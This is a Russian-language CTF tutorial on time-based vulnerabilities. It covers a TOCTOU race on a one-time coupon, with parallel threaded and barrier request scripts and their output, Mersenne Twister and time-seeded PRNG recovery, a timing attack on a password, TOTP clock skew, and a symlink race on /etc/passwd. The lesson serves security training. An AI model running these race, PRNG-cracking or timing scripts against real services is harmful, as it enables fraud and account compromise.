## Вопрос, с которого всё начинается

В прошлом уроке мы обходили лимит запросов. Но есть уязвимость тоньше: программа полагается на то, что «между двумя действиями ничего не произойдёт». Проверит купон — и спишет его. Проверит баланс — и переведёт деньги. Если успеть вклиниться между проверкой и действием, правило ломается. Это **race condition** (гонка) и **TOCTOU** — time-of-check to time-of-use, «время проверки против времени использования».

Разберём гонку на одноразовом купоне — и увидим её настоящий вывод.

## Наш пример: одноразовый купон

Веб-приложение позволяет обменять купон ровно один раз: в базе лежит флаг `used`, и после успешного обмена он становится `true`. Отправляем запрос один раз — всё честно:

```
$ curl -s -X POST 'http://shop.ctf/redeem' -d 'code=GIFT'
OK: reward granted
$ curl -s -X POST 'http://shop.ctf/redeem' -d 'code=GIFT'
FAIL: already used
```

Повторно купон не проходит. Но посмотрим на серверный код: он **сначала проверяет**, потом **использует** — и между этими шагами есть пусть крошечная, но пауза.

## Шаг 1: TOCTOU — окно между проверкой и использованием

Упрощённый обработчик выглядит так:

```python
if not used["flag"]:        # ПРОВЕРКА
    time.sleep(0.02)        # ... какая-то работа (окно гонки)
    used["flag"] = True     # ИСПОЛЬЗОВАНИЕ
    return "OK: reward granted"
return "FAIL: already used"
```

Между проверкой и записью флага проходит время. Если два запроса придут достаточно близко, **оба** успеют прочитать `used == False` до того, как первый его выставит. Оба пройдут проверку — и купон сработает дважды. Это и есть TOCTOU.

## Шаг 2: бьём параллельно

Ключ к гонке — не количество запросов, а **одновременность**. 100 одновременных запросов сильнее, чем 1000 последовательных. Отправляем 50 потоков сразу:

```python
import threading, urllib.request, collections

def fire(res):
    r = urllib.request.urlopen("http://shop.ctf/redeem", data=b"", timeout=5)
    res.append(r.read().decode())

res = []
ts = [threading.Thread(target=fire, args=(res,)) for _ in range(50)]
for t in ts: t.start()
for t in ts: t.join()
print(collections.Counter(res))
```

Реальный результат такого прогона:

```
Counter({'FAIL: already used': 44, 'OK: reward granted': 6})
```

Купон, который «можно использовать один раз», сработал **шесть раз**. Награда начислилась многократно — а значит, при задаче на баланс или лимит мы получаем лишние попытки, деньги или флаги. Для максимальной одновременности используют **barrier** — точку, где все потоки ждут друг друга и стартуют в один момент:

```python
import threading
barrier = threading.Barrier(30)
def worker():
    barrier.wait()          # все ждут здесь, потом бьют одновременно
    urllib.request.urlopen("http://shop.ctf/redeem", data=b"", timeout=5)
```

Иногда перед залпом полезен один «прогревающий» запрос (прогреть соединение и кэши), а HTTP/2 с мультиплексированием помогает уложиться в узкое окно. В Burp для этого есть **Turbo Intruder**, в CLI — `xargs -P` и GNU parallel.

## Шаг 3: предсказуемые «случайные» токены

Другая временная уязвимость — генератор, зависящий от времени. Если «случайный» токен сеется текущим `time()`, его можно воспроизвести, перебрав соседние секунды:

```python
import random, time
for seed in range(int(time.time()) - 60, int(time.time()) + 1):
    random.seed(seed)
    if random.getrandbits(32) == observed:
        print("seed =", seed)
```

В Python `random` — это **Mersenne Twister**: детерминированный генератор. После 624 подряд идущих 32-битных выводов его состояние восстанавливается полностью, и все дальнейшие числа предсказуемы:

```python
from randcrack import RandCrack
rc = RandCrack()
for _ in range(624):
    rc.submit(observed.getrandbits(32))
print(rc.predict_getrandbits(32))   # следующее «случайное» число
```

Это классика задач «казино»: собери 624 числа — и угадывай дальше с вероятностью 100%.

## Шаг 4: timing-атака

Если сравнение секрета идёт посимвольно и на совпавшем символе делает чуть больше работы, **время ответа** утекает информацию. Измеряем задержку для каждого кандидата и берём самый «долгий»:

```python
import requests, time
def timed(guess):
    t = time.perf_counter()
    requests.post(url, data={"pw": guess})
    return time.perf_counter() - t

best = ""
for _ in range(20):
    times = {c: sum(timed(best + c) for _ in range(5)) for c in alphabet}
    best += max(times, key=times.get)
```

На практике сетевой шум велик, поэтому каждого кандидата измеряют многократно и берут медиану или среднее. Медленно, но для коротких секретов работает.

## Шаг 5: логика дат и clock skew

Иногда уязвимость в бизнес-логике: сервер доверяет дате из запроса или сравнивает время в разных часовых поясах. Проверяйте, доверяет ли он клиентским датам и заголовкам (`Date`, `X-Forwarded-For`), и не путает ли секунды с миллисекундами. В задачах с **TOTP** (одноразовыми кодами по времени) проверяют соседние окна `counter ± 1`: из-за **clock skew** — расхождения часов клиента и сервера — код из соседнего окна может приниматься.

## Шаг 6: гонки в файловой системе

Временные уязвимости бывают не только в вебе. Классика — **симлинк-гонка**: программа пишет во временный файл с предсказуемым именем, а атакующий между проверкой и записью подменяет этот файл симлинком на `/etc/passwd`. Признак — предсказуемое имя временного файла и небезопасный порядок операций (проверка, потом открытие). Такие задачи встречаются в локальных CTF и при эскалации привилегий.

## Если не сработало

Гонка вероятностна — с первого раза может не выйти. Разберём, почему и что менять.

**Ни один запрос не «выиграл».** Окно гонки могло быть уже закрыто сервером: например, используется атомарная операция (`UPDATE ... WHERE used = false`) или блокировка строки в БД. Тогда классическая гонка не работает. Смотрим, нет ли *другого* окна: между двумя разными запросами (создать заказ → оплатить), между проверкой и записью в файл, между выдачей и списанием.

**Запросы уходят последовательно, а не одновременно.** `curl` в цикле шлёт их по одному. Нужны потоки, а лучше — **barrier**: точка синхронизации, где все потоки ждут и стартуют в одну миллисекунду. В HTTP/1.1 помогает открыть много соединений заранее; в HTTP/2 — мультиплексирование в одном соединении. Инструменты: Turbo Intruder (Burp), `xargs -P`, `hey`, собственный скрипт на asyncio.

**Сервер отвечает, но состояние не меняется дважды.** Значит, критическая секция защищена. Пробуем увеличить число попыток (гонка вероятностна: 50–200 запросов), добавить «прогревающий» запрос перед залпом и повторить несколько раз — иногда выигрывает не первый, а двадцатый заход.

**Предсказуемый генератор не воспроизводится.** Проверяем, чем именно засеян PRNG: `time()`, `pid`, `microtime`, порядковый номер. Иногда seed собирают из нескольких источников — тогда перебирают комбинации. Для Mersenne Twister хватает 624 последовательных 32-битных выводов; для LCG (линейного конгруэнтного генератора) — нескольких значений, из которых решается система уравнений.

## Частые вопросы

**Гонка — это про скорость сети?** Нет, про одновременность. Важна не скорость одного запроса, а то, что несколько запросов пересекаются в окне между проверкой и изменением.

**Сколько запросов нужно?** Зависит от окна: чем оно шире, тем меньше нужно. Начинай с 30–50 одновременных и увеличивай. Повторяй залп несколько раз — гонка вероятностна.

**Что такое TOCTOU простыми словами?** Программа сначала *проверяет* условие, потом *действует*. Если между этими шагами состояние изменилось — действие выполняется по устаревшей проверке.

**Timing-атака надёжна по сети?** Слабо. Сетевой шум маскирует разницу в микросекунды. Помогают многократные измерения и медиана, а в CTF часто дают локальный доступ, где шум меньше.

## Как измерять и не обмануться

Гонка и тайминги — вероятностные, поэтому важен *статистический* подход. Для race condition повторяй залп 5–10 раз: если сработало хотя бы раз — уязвимость есть. Для timing-атаки измеряй не один запрос, а серию, бери медиану и отбрасывай выбросы: среднее чувствительно к редким сетевым задержкам, медиана устойчивее. Полезно вычесть базовую задержку, замерив запрос с заведомо неверным префиксом.

Для задач с датами помни про часовые пояса и форматы: сервер может сравнивать UTC, а клиент присылать локальное время, или путать секунды с миллисекундами. Иногда «баг» именно в этом — дата в будущем обходит проверку срока действия. Проверяй, доверяет ли сервер заголовку `Date` и полю даты из запроса.

## Что мы теперь знаем

- **TOCTOU** — изменение состояния между проверкой и использованием; отсюда гонки.
- **Гонка** эксплуатируется **параллельными** запросами (barrier, потоки), а не количеством.
- Одноразовый купон/токен при гонке срабатывает многократно.
- **Предсказуемые генераторы** (seed = время, MT19937) восстанавливаются, и «случайность» исчезает.
- **Timing-атака** читает секрет по времени ответа; нужны повторы и усреднение.
- **Логика дат** и **clock skew** в TOTP — тоже временные уязвимости.

## На что смотреть дальше

При виде любой логики «проверить-потом-сделать» сразу спрашивай: что будет, если два действия произойдут одновременно? Для гонок готовь параллельные запросы и повторяй десятки раз — гонка вероятностна. Для «случайных» значений проверяй seed и восстанавливай PRNG (`randcrack`, `mersenne-twister-predictor`). Для таймингов измеряй `time.perf_counter()` и усредняй. Держи под рукой Turbo Intruder, `xargs -P` и `hey`/`wrk`.
